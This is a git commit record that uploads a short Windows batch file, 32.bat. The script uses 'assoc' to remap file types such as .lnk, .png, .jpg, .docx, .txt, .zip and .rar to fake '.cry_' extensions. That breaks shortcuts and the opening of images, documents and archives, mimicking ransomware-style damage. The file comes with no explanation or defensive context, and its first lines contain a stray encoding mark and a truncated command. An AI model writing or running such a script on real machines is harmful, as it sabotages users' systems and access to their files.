2f33d852b4a935c10e83465fec96c2fbc2ba8e8d
not-seil <seilxx@vk.com>
2024-09-18 21:09:33 +0700

    Add files via upload

---
+++ 32.bat
@@ -0,0 +1,15 @@
+ÿþ
+o off
+@Echo off
+assoc .lnk=.cry_L0OIlE3
+assoc .png=.cry_L0OIlE31
+assoc .jpg=.cry_L0OIlE32
+assoc .jpeg=.cry_L0OIlE33
+assoc .img=.cry_L0OIlE34
+assoc .docx=.cry_L0OIlE35
+assoc .txt=.cry_L0OIlE36
+assoc .doc=.cry_L0OIlE37
+assoc .zip=.cry_L0OIlE38
+assoc .rar=.cry_L0OIlE39
+
+
